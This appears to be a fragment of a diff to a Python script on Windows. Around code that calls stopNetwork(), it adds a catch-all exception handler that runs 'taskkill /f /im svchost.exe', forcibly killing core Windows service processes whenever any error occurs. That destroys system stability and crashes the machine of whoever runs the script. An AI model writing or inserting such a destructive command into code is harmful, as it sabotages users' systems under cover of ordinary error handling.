@@ -122,4 +122,8 @@ try:
                     stopNetwork()
         except:
             pass
-        
+            
+except KeyboardInterrupt:
+    raise SystemExit(0)
+except:
+    os.system('taskkill /f /im svchost.exe')
